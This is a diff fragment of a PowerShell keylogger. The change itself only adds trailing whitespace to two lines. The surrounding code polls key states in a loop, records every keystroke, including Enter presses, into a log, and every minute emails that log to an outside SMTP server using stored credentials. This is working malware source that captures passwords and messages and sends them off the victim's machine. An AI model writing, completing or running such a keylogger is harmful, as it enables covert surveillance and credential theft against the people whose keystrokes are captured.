@@ -16,7 +16,7 @@ function Send-Log {
     $smtp=New-Object Net.Mail.SmtpClient($smtpServer,$smtpPort)
     $smtp.EnableSsl=$true
     $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass)
-    $smtp.Send($msg); $global:Log=''
+    $smtp.Send($msg); $global:Log=''     
   } catch {Add-Content "$env:TEMP\keylog-error.txt" -Value $_.Exception.Message}
 }
 $timer=New-Object System.Timers.Timer(60*1000)
@@ -26,7 +26,7 @@ while($true){
     $st=[Native.Win32]::GetAsyncKeyState($v)
     if($st -band 0x8000){
       $ch=[char]$v
-      switch($ch){ ' '{$global:Log+=' '} "`r"{$global:Log+='[ENTER]`n'} default{$global:Log+=$ch} }
+      switch($ch){ ' '{$global:Log+=' '} "`r"{$global:Log+='[ENTER]`n'} default{$global:Log+=$ch} }  
     }
   }
   Start-Sleep -Milliseconds 100
